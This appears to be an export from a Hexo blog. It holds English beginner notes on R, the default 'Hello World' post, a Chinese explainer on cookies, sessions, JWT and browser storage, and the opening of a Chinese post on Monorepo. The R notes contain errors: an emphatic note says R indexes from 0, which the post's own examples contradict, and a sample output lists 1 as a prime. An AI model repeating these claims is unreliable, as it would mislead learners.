<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">x &lt;- 10</span><br><span class="line">y &lt;- 20</span><br></pre></td></tr></table></figure></li>
<li><p>Calculation operation</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">x + y</span><br><span class="line">x * y</span><br><span class="line">x / y</span><br><span class="line">x ^ y</span><br><span class="line">x %% y <span class="comment"># the module of x/y</span></span><br><span class="line"><span class="built_in">log</span>(x,y) <span class="comment"># The log to the base y of x</span></span><br><span class="line"><span class="built_in">sqrt</span>(x) <span class="comment"># the square root of x</span></span><br><span class="line">mean(<span class="built_in">c</span>(x,y)) <span class="comment"># the mean between x and y, but remember to use the vector in the mean function!!!</span></span><br><span class="line"><span class="built_in">trunc</span>(x) <span class="comment"># discard the decimals of x</span></span><br><span class="line"><span class="built_in">round</span>(x,y) <span class="comment"># generally use rounding and keep y decimal places, but will be affected by floating point numbers</span></span><br></pre></td></tr></table></figure>
<h4 id="Logical-Operations"><a href="#Logical-Operations" class="headerlink" title="Logical Operations"></a>Logical Operations</h4></li>
</ol>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">x &gt;= y -<span class="number">3</span> <span class="comment"># arithmetic operations take priority</span></span><br><span class="line">x &lt;= y</span><br><span class="line">x == y</span><br><span class="line">x != y</span><br><span class="line">w &lt;- <span class="literal">TRUE</span></span><br><span class="line">z &lt;- <span class="literal">FALSE</span></span><br><span class="line">!w <span class="comment"># not</span></span><br><span class="line">w | z <span class="comment"># or</span></span><br><span class="line">w &amp; z <span class="comment"># and</span></span><br><span class="line">isTRUE(operation) <span class="comment"># identify if the result is TRUE</span></span><br><span class="line">identical(x,y) <span class="comment"># only when the two objects are the same, it will return TRUE</span></span><br><span class="line">xor(operation1,operation2) <span class="comment"># only when one is TRUE and the other is FALSE, it will return TRUE</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># which, any, all, three of them all use logical vector as its argument e.g. vector &gt; 10</span></span><br><span class="line">which(vector &gt; <span class="number">10</span>) <span class="comment"># It returns the index of all the TRUE elements in the vector.</span></span><br><span class="line"><span class="built_in">any</span>(vector &gt; <span class="number">10</span>) <span class="comment"># when one or some elements is TRUE, it will return TRUE</span></span><br><span class="line"><span class="built_in">all</span>(vector &gt; <span class="number">10</span>) <span class="comment"># when all the elements are TRUE, it will return TRUE</span></span><br></pre></td></tr></table></figure>


<hr>
<h3 id="2-Some-additional-functions"><a href="#2-Some-additional-functions" class="headerlink" title="2   Some additional functions"></a>2   Some additional functions</h3><blockquote>
<p><strong>For example</strong></p>
<p><strong>schoolmath</strong></p>
</blockquote>
<p><strong>Here are all its functions</strong></p>
<ol>
<li><p>cancel.fraction(numerator, denominator)</p>
<p><em>It cancels a fraction to its simplest form</em></p>
</li>
<li><p>decimal2fraction(decimal, period=0)</p>
<p><em>It converts a decimal number into a fraction and the argument period means the repeating ending number if it has.</em></p>
<p><em>E.g. 12.123444444…, so it will be decimal2fraction(12.123,4)</em></p>
</li>
<li><p>gcd(x, y)</p>
<p><em>It gives the greatest common divisor of two numbers, x and y</em></p>
</li>
<li><p>scm(x, y)</p>
<p><em>It gives the smallest common multiple of two numbers, x and y</em></p>
</li>
<li><p>is. type function</p>
<p><em>x can be a <strong>number</strong> or a <strong>vector</strong> and it returns <strong>TRUE/FALSE</strong></em></p>
<ul>
<li>is.decimal(x) </li>
<li>is.whole(x)</li>
<li>is.even(x)</li>
<li>Is.odd(x)</li>
<li>is.negative(x)</li>
<li>is.positive(x)</li>
<li>is.real.positive(x)      <em>zero is included as a positive number</em></li>
<li>is.prim(x)</li>
</ul>
</li>
<li><p>prime.factor(x)</p>
<p><em>It gives a <strong>vector</strong> of all the prime-factors (except 1) of a number x</em></p>
</li>
<li><p>primes(start, end)</p>
<p><em>It gives a <strong>vector</strong> of prime-numbers between start number and end number, if it’s not given start and end, it will give all the prim-numbers</em></p>
</li>
<li><p>primlist</p>
<p><em>It gives a <strong>vector</strong> of prime-numbers between 1 and 9999999</em></p>
<p>e.g.</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">primlist[<span class="number">1</span>:<span class="number">10</span>]</span><br></pre></td></tr></table></figure>

<p>#[1]  1  2  3  5  7 11 13 17 19 23</p>
</li>
</ol>
<h3 id="3-Some-Data-Structures"><a href="#3-Some-Data-Structures" class="headerlink" title="3    Some Data Structures"></a>3    Some Data Structures</h3><blockquote>
<p><em><strong>There are vectors, sequences, matrices, lists, arrays and data frames.</strong></em></p>
</blockquote>
<h4 id="3-1-Vectors-and-Sequences"><a href="#3-1-Vectors-and-Sequences" class="headerlink" title="3-1  Vectors and Sequences"></a>3-1  Vectors and Sequences</h4><h5 id="How-to-define-vectors-and-sequences"><a href="#How-to-define-vectors-and-sequences" class="headerlink" title="How to define vectors and sequences"></a>How to define vectors and sequences</h5><ol>
<li><p>Vectors</p>
<p>Use the c() function, which stands for ‘concatenate’:  </p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">a &lt;- <span class="built_in">c</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<p>If you want to create a vector with the same repeated value, use rep(x, times=) or rep(x, each=):  </p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rep</span>(<span class="number">1</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<p>#[1]  1 1 1</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rep</span>(<span class="built_in">c</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>),<span class="number">2</span>)</span><br><span class="line"><span class="built_in">rep</span>(<span class="built_in">c</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>),times=<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>#[1]  1 2 3 1 2 3</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rep</span>(<span class="built_in">c</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>),each=<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>#[1]  1 1 2 2 3 3</p>
</li>
<li><p>Sequences</p>
<p>Use the : operator or the seq(from=, to=, by=) function</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">b &lt;- 1:<span class="number">100</span></span><br><span class="line">b1 &lt;- seq(<span class="number">1</span>,<span class="number">100</span>)</span><br><span class="line">b2 &lt;- seq(from=<span class="number">1</span>, to=<span class="number">100</span>)</span><br><span class="line">b3 &lt;- seq(from=<span class="number">1</span>, to=<span class="number">100</span>, by=<span class="number">1</span>)</span><br><span class="line">b4 &lt;- seq(to=<span class="number">100</span>, from=<span class="number">1</span>, by=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>#all the 5 outputs are same</p>
</li>
</ol>
<h5 id="Some-arithmetic-and-logical-operations"><a href="#Some-arithmetic-and-logical-operations" class="headerlink" title="Some arithmetic and logical operations"></a>Some arithmetic and logical operations</h5><ol>
<li><p>Select certain element using index</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">a[<span class="number">1</span>]</span><br></pre></td></tr></table></figure>
<p>#[1]    1</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">a[-<span class="number">1</span>]</span><br></pre></td></tr></table></figure>
<p>#[1]    2 3</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">a[<span class="built_in">c</span>(<span class="number">1</span>,<span class="number">2</span>)]</span><br></pre></td></tr></table></figure>
<p>#[1]    1 2</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">a[<span class="number">1</span>:<span class="number">3</span>]</span><br></pre></td></tr></table></figure>
<p>#[1]    1 2 3</p>
<p>For index selection, sequences are the same as vectors.</p>
<p><em><strong>NOTICE: In R, the first index is 0 which is totally different from most of other script languages!!!</strong></em></p>
</li>
<li><p>Logical operations application</p>
<p><strong>&gt;  &lt;  ==  !=</strong></p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">a&gt;<span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>#[1]    FALSE FALSE TRUE</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">a[a&gt;<span class="number">2</span>]</span><br></pre></td></tr></table></figure>
<p>#[1]    3</p>
<p>For logical operations, sequences are the same as vectors.</p>
</li>
<li><p>Arithmetic operations</p>
<p> <em>In most cases, these operations are performed</em> <em><strong>element by element</strong></em></p>
<p>e.g.</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">a + <span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>#[1]    4 5 6</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">a - -<span class="number">3</span>:-<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>#[1]    4 4 4</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">a == <span class="number">5</span>:<span class="number">7</span></span><br></pre></td></tr></table></figure>
<p>#[1]    FALSE FALSE FALSE</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sqrt</span>(a)</span><br></pre></td></tr></table></figure>
<p>#[1]    1.000000 1.414214 1.732051</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">mean(a)</span><br></pre></td></tr></table></figure>
<p>#[1]    2</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">sd(a) <span class="comment"># standard deviation</span></span><br></pre></td></tr></table></figure>
<p>#[1]    1</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">median(a) <span class="comment"># median</span></span><br></pre></td></tr></table></figure>
<p>#[1]    2</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">summary(a) <span class="comment"># min max mean med quartile infromation</span></span><br></pre></td></tr></table></figure>
<p>#Min. 1st Qu.  Median    Mean  3rd Qu.    Max.</p>
<p>   1.0       1.5          2.0            2.0       2.5         3.0 </p>
</li>
</ol>
<h4 id="3-2-Matrices"><a href="#3-2-Matrices" class="headerlink" title="3-2  Matrices"></a>3-2  Matrices</h4><h5 id="1-How-to-define-matrices"><a href="#1-How-to-define-matrices" class="headerlink" title="1. How to define matrices"></a>1. How to define matrices</h5><ul>
<li>Use <strong>matrix()</strong> function, </li>
</ul>
<p>matrix(vector, nrow=r, ncol=c, byrow=FALSE, dimnames=list(char_vector_rownames, char_vector_colnames))</p>
<p><em>The default is the matrix is filled by columns</em></p>
<p>e.g.</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">rnames &lt;- <span class="built_in">c</span>(<span class="string">&quot;1st row&quot;</span>, <span class="string">&quot;2nd row&quot;</span>)</span><br><span class="line">cnames &lt;- <span class="built_in">c</span>(<span class="string">&quot;1st col&quot;</span>, <span class="string">&quot;2nd col&quot;</span>)</span><br><span class="line">A &lt;- matrix(<span class="built_in">c</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>),nrow=<span class="number">2</span>,byrow=<span class="literal">TRUE</span>, <span class="built_in">dimnames</span>=<span class="built_in">list</span>(rnames, cnames))</span><br></pre></td></tr></table></figure>
<ul>
<li><p>Use bind function, <strong>rbind()     cbind()</strong></p>
<p><em>bind by row: rbind(v1, v2, …)</em></p>
<p><em>bind by col: bind(v1, v2, …)</em></p>
<p>e.g.</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">A &lt;- rbind(<span class="built_in">c</span>(<span class="number">1</span>,<span class="number">2</span>),<span class="built_in">c</span>(<span class="number">3</span>,<span class="number">4</span>))</span><br></pre></td></tr></table></figure>
<p>The two outputs are the same.</p>
</li>
</ul>
<h5 id="2-How-to-use-index"><a href="#2-How-to-use-index" class="headerlink" title="2. How to use index"></a>2. How to use index</h5><p><em>Generally, matrices are 2 dimensions, so [rownumber, colnumber] can locate the certain element in the matrix.</em></p>
<p>e.g.</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">A[<span class="number">1</span>,<span class="number">2</span>] <span class="comment"># the element at the 1st row and 2nd col</span></span><br></pre></td></tr></table></figure>
<p><em>If we’d like to get certain whole row or column, we should leave the other dimension blank.</em></p>
<p>e.g.</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">A[,<span class="number">2</span>] <span class="comment"># 2nd column</span></span><br><span class="line">A[<span class="number">1</span>,] <span class="comment"># 1st row</span></span><br><span class="line">A[<span class="number">1</span>:<span class="number">2</span>,<span class="number">1</span>] <span class="comment"># row 1,2 of column 1</span></span><br><span class="line">A[<span class="built_in">c</span>(<span class="number">1</span>,<span class="number">2</span>),<span class="built_in">c</span>(<span class="number">1</span>,<span class="number">2</span>)] <span class="comment">#row 1,2 of column 1,2</span></span><br><span class="line">A[-<span class="number">1</span>,] <span class="comment"># drop 1st row and show other rows</span></span><br><span class="line">A[A%%2==<span class="number">0</span>] <span class="comment"># all the even numbers</span></span><br></pre></td></tr></table></figure>
<h5 id="3-Arithmetic-logical-and-statistical-operations"><a href="#3-Arithmetic-logical-and-statistical-operations" class="headerlink" title="3. Arithmetic, logical and statistical operations"></a>3. Arithmetic, logical and statistical operations</h5><ul>
<li><p><em>Mostly, the operations are performed element by element</em></p>
<p><strong>+  -  *  /  ^</strong></p>
</li>
<li><p>arithmetic matrix operation</p>
<p>e.g. <strong>%*%</strong> is the arithmetic matrix multiplication</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">A %*% B</span><br></pre></td></tr></table></figure></li>
<li><p>statistical operation</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sqrt</span>(A)</span><br><span class="line">mean(A) <span class="comment"># mean of all values</span></span><br><span class="line">rowMeans(A) <span class="comment"># mean by row</span></span><br><span class="line">colMeans(A) <span class="comment"># mean by column</span></span><br><span class="line">sd(A)</span><br><span class="line"><span class="built_in">length</span>(A) <span class="comment"># the number of all elements</span></span><br><span class="line">ncol(A) <span class="comment"># the number of columns</span></span><br><span class="line">nrow(A) <span class="comment"># the number of rows</span></span><br><span class="line">rowSums(A) <span class="comment"># the sum of each row</span></span><br><span class="line">colSums(A) <span class="comment"># the sum of each column</span></span><br></pre></td></tr></table></figure></li>
<li><p>logical operation</p>
<p><strong>element by element</strong></p>
<p><em>==    !=    &gt;    &lt;</em></p>
</li>
</ul>
<h4 id="3-3-Arrays"><a href="#3-3-Arrays" class="headerlink" title="3-3  Arrays"></a>3-3  Arrays</h4><h5 id="1-How-to-define"><a href="#1-How-to-define" class="headerlink" title="1. How to define"></a>1. How to define</h5><p><em>Arrays are similar to matrices but can have over 2 dimensions</em></p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">arra &lt;- array(<span class="number">1</span>:<span class="number">8</span>,<span class="built_in">dim</span>=<span class="built_in">c</span>(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>), <span class="built_in">dimnames</span>=<span class="built_in">list</span>(<span class="built_in">c</span>(<span class="string">&#x27;x1&#x27;</span>,<span class="string">&#x27;x2&#x27;</span>),<span class="built_in">c</span>(<span class="string">&#x27;y1&#x27;</span>,<span class="string">&#x27;y2&#x27;</span>),<span class="built_in">c</span>(<span class="string">&#x27;z1&#x27;</span>,<span class="string">&#x27;z2&#x27;</span>))) <span class="comment"># 3D array which is the 2*2*2 structure</span></span><br></pre></td></tr></table></figure>
<h5 id="2-How-to-use-index-1"><a href="#2-How-to-use-index-1" class="headerlink" title="2. How to use index"></a>2. How to use index</h5><figure class="highlight r"><table><tr><td class="code"><pre><span class="line">arra[,,<span class="number">1</span>]</span><br><span class="line">arra[,,<span class="string">&#x27;z1&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>The two outputs are both the 1st layer of 3rd axis.</p>
<h5 id="3-Operations"><a href="#3-Operations" class="headerlink" title="3. Operations"></a>3. Operations</h5><figure class="highlight r"><table><tr><td class="code"><pre><span class="line">arra1 &lt;- array(sample.int(<span class="number">100</span>,<span class="number">27</span>), <span class="built_in">dim</span>=<span class="built_in">c</span>(<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>)) <span class="comment"># sample functiongenerates 27 random numbers between 0 and 100</span></span><br></pre></td></tr></table></figure>
<p><em>Most of them are the same as matrices, except statistical functions e.g. colMeans(), rowMeans() and rowSums(), colSums()</em></p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">rowMeans(arra1)</span><br></pre></td></tr></table></figure>
<p>The output will be three numbers, of which one is <strong>mean of arra1[1/2/3,,]</strong></p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">colMeans(arra1)</span><br></pre></td></tr></table></figure>
<p>The output will be a 3*3 matrix, where each element is <strong>the mean of arra1[,1/2/3,1/2/3]</strong></p>
<h3 id="4-Simple-Plots"><a href="#4-Simple-Plots" class="headerlink" title="4  Simple Plots"></a>4  Simple Plots</h3><h4 id="How-to-define"><a href="#How-to-define" class="headerlink" title="How to define"></a>How to define</h4><p><em>Use plot() function</em></p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">diagram1 &lt;- plot(x, y, col=<span class="string">&quot;colorname&quot;</span>, type=<span class="string">&quot;the type of plot e.g. p/l/c/o/s/h/n&quot;</span>, pch=<span class="string">&quot;the shape of dot e.g. 0:25&quot;</span>, main=<span class="string">&quot;title&quot;</span>, xlab=<span class="string">&quot;X Label&quot;</span>, ylab=<span class="string">&quot;Y Label&quot;</span>, bg=<span class="string">&quot;dot color only when pch=21:25&quot;</span>, ...)</span><br></pre></td></tr></table></figure>


<p>Finally, there’re still some knowledge I haven’t mentioned, such as data frame and some more complicated applications of all the structures and plot() function. They will be discussed in the following notes later.</p>
]]></content>
      <categories>
        <category>R</category>
      </categories>
      <tags>
        <tag>R</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2021/02/14/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>会话技术</title>
    <url>/2021/12/06/SessionTech/</url>
    <content><![CDATA[<p><strong>在互联网发展之初，Web主要用于文档浏览，服务器无需维护客户端的用户状态，因此HTTP请求是无状态的。然而随着互联网的快速发展，无状态的请求已经无法满足需求，因此就引入了会话技术。</strong></p>
<a id="more"></a>

<h1 id="会话技术-（Session）"><a href="#会话技术-（Session）" class="headerlink" title="会话技术 （Session）"></a>会话技术 （Session）</h1><h2 id="初代篇——Cookie"><a href="#初代篇——Cookie" class="headerlink" title="初代篇——Cookie"></a>初代篇——Cookie</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><ol>
<li><p>cookie是一种<strong>存储在用户本地终端</strong>（一般为浏览器）上的数据</p>
</li>
<li><p>文件大小一般<strong>不超过4kb</strong></p>
</li>
<li><p>数据以<strong>key-value形式</strong>存在</p>
</li>
<li><p>可以设置过期时间<code>expires</code>（生命周期）</p>
<ul>
<li><p><strong>会话型</strong></p>
<blockquote>
<p>当<code>expires</code>属性缺省时，为会话型cookie，且cookie仅保存在内存中，并在用户关闭浏览器时失效</p>
</blockquote>
<ul>
<li><p><strong>持久型</strong></p>
<blockquote>
<p>cookie会存储在用户的硬盘中，直到生命周期结束或用户进行某些操作例如”登出”等结束会话时才会失效</p>
</blockquote>
</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>cookie由服务器生成</strong>，发送给浏览器，浏览器把cookie以key-value的形式存储起来，<strong>下次请求该服务器时把该cookie一并发送给服务器</strong>。</p>
</li>
<li><p>所有 cookie 都会作为请求头部由浏览器发送给服务器</p>
</li>
<li><p>cookie遵循同源策略限制（即域名、端口等必须一致）</p>
</li>
</ol>
<h2 id="升级篇——Session"><a href="#升级篇——Session" class="headerlink" title="升级篇——Session"></a>升级篇——Session</h2><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>session是服务器端存储的<strong>一个对象</strong>（存储在内存中），主要用于存储访问过服务器的已验证的<strong>客户端用户信息</strong>。但当服务器重启，内存会销毁，存储的用户信息会消失。</p>
<h3 id="2-工作原理"><a href="#2-工作原理" class="headerlink" title="2. 工作原理"></a>2. 工作原理</h3><p>客户端用户会使用账号、密码登录服务器，服务器验证成功后，会生成并存储一个sessionid来标记用户，同时会将sessionid通过cookie发送给客户端，客户端会将接收到的sessionid保存到cookie中。客户端再次访问服务器时，会默认携带cookie。</p>
<p><strong>因此，session也是基于cookie的，所以它也遵循同源限制策略。</strong></p>
<h3 id="3-Session持久化"><a href="#3-Session持久化" class="headerlink" title="3. Session持久化"></a>3. Session持久化</h3><p>由于session是存储在内存中，因而服务器一旦重启，session就会消失。<strong>将session存储在数据库中</strong>可以解决这一问题，实现session的持久化。</p>
<h2 id="流行篇—Token"><a href="#流行篇—Token" class="headerlink" title="流行篇—Token"></a>流行篇—Token</h2><h3 id="1-简介-1"><a href="#1-简介-1" class="headerlink" title="1. 简介"></a>1. 简介</h3><blockquote>
<p>Token是由服务器生成的一串字符串，并将其发送给客户端由客户端存储，而服务端则仅保存密钥，且此密钥不能泄露。</p>
</blockquote>
<p>下面以JSON Web Token为例。</p>
<h3 id="2-JWT原理"><a href="#2-JWT原理" class="headerlink" title="2. JWT原理"></a>2. JWT原理</h3><p>服务器认证用户后，会生成一个JSON对象（如下代码），返回给客户端。以后用户与服务端通信时，都会发送这个JSON对象，服务器会<strong>依据这个JSON对象来识别用户身份</strong>。但为了<strong>防止用户/中间人篡改数据</strong>，服务端会<strong>在生成这个对象时，加上签名</strong>。这样，<strong>服务端就不需要保存任何session数据</strong>了，因此服务端变成了无状态，从而比较容易实现扩展。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;username&quot;</span>: <span class="string">&quot;Tom&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;authority&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;expiration&quot;</span>: <span class="string">&quot;2021-12-25&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="3-JWT数据结构"><a href="#3-JWT数据结构" class="headerlink" title="3. JWT数据结构"></a>3. JWT数据结构</h3><p><strong>它由三部分组成，分别是header（头）、payload（负载）、signature（签名）。</strong></p>
<ol>
<li><p>header</p>
<blockquote>
<p>包含signature的算法</p>
</blockquote>
</li>
<li><p>payload</p>
<blockquote>
<p>包含用户信息，用于识别对应请求的客户端用户</p>
</blockquote>
</li>
<li><p>signature</p>
<blockquote>
<p>是通过特定算法将密钥、payload、header三部分加密而形成的字符串</p>
</blockquote>
</li>
</ol>
<p>最后，token的形式为<code>header.payload.signature</code>的字符串，用于进行前后端的用户数据传递，以维护用户登录状态。</p>
<h2 id="番外篇——Web-Storage"><a href="#番外篇——Web-Storage" class="headerlink" title="番外篇——Web Storage"></a>番外篇——Web Storage</h2><p>随着 Web 应用的发展，客户端存储的使用越来越广泛，其中最简单且兼容性最好的是 Cookie，然而 cookie 也存在很多缺陷。</p>
<p>Web Storage 的<strong>目的是解决客户端存储不需要频繁发送回服务器的数据时使用 cookie 的问题。</strong></p>
<p>Web Storage 定义了两个对象：<strong>sessionStorage, localStorage</strong>（不受页面刷新影响而存储数据的两种方式）。浏览器通过 Web Storage 以同步阻塞的方式实现存储写入，因此数据会被立即提交存储。</p>
<h3 id="1-Storage-类型"><a href="#1-Storage-类型" class="headerlink" title="1. Storage 类型"></a>1. Storage 类型</h3><p>Storage 类型用于保存名/值对数据，即 key/value。sessionStorage 和 localStorage 都是 Storage 的实例。Storage 类型只能存储字符串。</p>
<p>Storage 的方法：</p>
<blockquote>
<ol>
<li>clear()</li>
<li>getItem(name)</li>
<li>key(index)</li>
<li>removeItem(name)</li>
<li>setItem(name, value)</li>
</ol>
</blockquote>
<h3 id="2-sessionStorage-——跨会话的存储机制"><a href="#2-sessionStorage-——跨会话的存储机制" class="headerlink" title="2. sessionStorage ——跨会话的存储机制"></a>2. sessionStorage ——跨会话的存储机制</h3><ol>
<li>sessionStorage 用于<strong>本地存储一个会话（session）中的数据</strong></li>
<li>这些数据只有<strong>在同一个会话中的页面才能访问使用</strong>（在多页应用程序中有限制），并在<strong>会话结束后销毁数据</strong></li>
<li>因此 sessionStorage 不是一种持久化的本地存储，仅仅是<strong>会话级别的存储</strong></li>
<li>不受页面刷新影响</li>
</ol>
<h3 id="3-localStorage——永久存储机制"><a href="#3-localStorage——永久存储机制" class="headerlink" title="3. localStorage——永久存储机制"></a>3. localStorage——永久存储机制</h3><ol>
<li>localStorage 用于<strong>客户端持久存储数据</strong></li>
<li><strong>除非主动删除</strong>数据，否则数据<strong>永远不会过期</strong></li>
<li>访问 localStorage 的数据，页面需要来自同一个域（子域不可以）、在相同的端口上使用相同的协议</li>
<li>不受页面刷新影响</li>
</ol>
<h3 id="4-两种方式的主要区别"><a href="#4-两种方式的主要区别" class="headerlink" title="4. 两种方式的主要区别"></a>4. 两种方式的主要区别</h3><ol>
<li><p><strong>存储时间：</strong></p>
<ul>
<li><p><strong>localStorage 数据永久保存：</strong>存储在 localStorage 中的数据会保留，直到通过 JS 主动删除或用户清除浏览器缓存。因此 localStorage 的数据在关闭窗口、标签页或重启浏览器后，仍然存在。</p>
</li>
<li><p><strong>sessionStorage 数据与页面会话时间有关：</strong>sessionStorage 的数据在页面或浏览器关闭后就消失了。</p>
</li>
</ul>
</li>
<li><p><strong>访问权限：</strong></p>
<ul>
<li>访问使用修改 localStorage 数据：<strong>页面需要来自同一个域（子域不可以）、在相同的端口上使用相同的协议</strong></li>
<li>sessionStorage更严格：<strong>需要是同一个会话的页面，即最初存储数据的页面</strong></li>
</ul>
</li>
</ol>
<h3 id="5-限制"><a href="#5-限制" class="headerlink" title="5. 限制"></a>5. 限制</h3><ol>
<li>一般来说，客户端数据大小限制为每个源 （协议、域和端口）5MB</li>
</ol>
<h2 id="IndexedDB"><a href="#IndexedDB" class="headerlink" title="IndexedDB"></a>IndexedDB</h2><p><strong>Indexed Database API 简称 IndexedDB</strong>，是浏览器中存储结构化数据的一种方案。IndexedDB 用于代替目前已废弃的 Web SQL Database API。</p>
<p>IndexedDB 的设计几乎完全是异步的。</p>
<h3 id="1-特点"><a href="#1-特点" class="headerlink" title="1. 特点"></a>1. 特点</h3><ol>
<li><strong>键值对存储：</strong>IndexedDB 内部采用对象仓库（object store）存放数据</li>
<li><strong>异步：</strong>与 Storage 形成对比，异步设计是为了防止大量数据的读写会拖慢页面的表现</li>
<li><strong>支持事务：</strong>不存在只改写一部分数据的情况。一个事务中的一系列的操作步骤中，只要有一步失败，整个事务就都取消。</li>
<li><strong>同源限制：</strong>网页只能访问自身域名下的数据库</li>
<li><strong>大存储空间：</strong>一般来说不小于250 MB</li>
<li><strong>支持二进制存储：</strong>例如 ArrayBuffer 对象和 Blob 对象</li>
</ol>
]]></content>
      <categories>
        <category>FrontEnd/前端</category>
      </categories>
      <tags>
        <tag>FrontEnd</tag>
      </tags>
  </entry>
  <entry>
    <title>浅析前端流行仓库管理模式——Monorepo</title>
    <url>/2022/08/08/%E6%B5%85%E6%9E%90%E5%89%8D%E7%AB%AF%E6%B5%81%E8%A1%8C%E4%BB%93%E5%BA%93%E7%AE%A1%E7%90%86%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94Monorepo/</url>
    <content><![CDATA[<p>Monorepo 即代码的仓库维护方式，已经被诸多知名互联网公司如 Google、Meta、Microsoft 等公司使用了很多年，该模式的主要特点是<strong>将所有代码都集中到一个仓库中管理</strong>。与 Monorepo 相对的是 Multirepo（又叫 Polyrepo），该模式下每个模块都有自己独立的仓库。Monorepo 是目前前端开源项目的趋势之一，Vue3、Yarn2 等知名项目均已改用 Monorepo 模式。</p>
<p>但对于业务型项目的 Monorepo，目前普及地还不是很广泛，虽然如此，业务型 Monorepo 也能给业务开发带来极大的便利。本文主要介绍业务型 Monorepo，使用它的好处，以及业务型 Monorepo 的工程化建设。</p>
<a id="more"></a>

